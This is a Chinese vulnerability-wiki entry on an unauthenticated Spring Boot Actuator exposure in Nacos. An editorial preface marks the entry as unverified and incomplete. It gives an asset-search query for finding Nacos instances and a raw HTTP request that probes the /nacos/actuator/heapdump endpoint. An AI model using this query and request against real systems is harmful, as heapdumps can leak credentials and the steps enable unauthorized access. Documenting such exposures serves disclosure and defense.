---
source: "wy876 漏洞文库"
title: "Nacos存在Spring boot Actuator未授权漏洞"
product: "Nacos依赖的Spring Boot Actuator"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "management endpoints被暴露且未鉴权，实际Nacos/SpringBoot版本与访问路径可达"
fofa_unverified: "app.name="
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-37bd4bfa123476e59a0ad3c4"
entity_id: "ve-37bd4bfa123476e59a0ad3c4"
schema_version: "1"
---

# Nacos存在Spring boot Actuator未授权漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：management endpoints被暴露且未鉴权，实际Nacos/SpringBoot版本与访问路径可达
- 证据范围：只有HEAD heapdump请求，不包含响应，HEAD不能证明实际可下载堆内容

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 缺版本、端点暴露配置、响应/鉴权对照与修复
- 不能把/nacos/actuator列表可达等同敏感端点泄露
- fofa字段残缺，HTML模板多于信息

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
<font style="color:rgb(63, 63, 63);">Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。Nacos存在Spring boot Actuator未授权漏洞</font>

# <font style="color:rgb(51, 51, 51);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">Nacos </font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="Nacos"`
+ 特征


# 四、漏洞复现
```plain
/nacos/actuator/
```


```http
HEAD /nacos/actuator/heapdump HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/utanzrai31cospcx>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
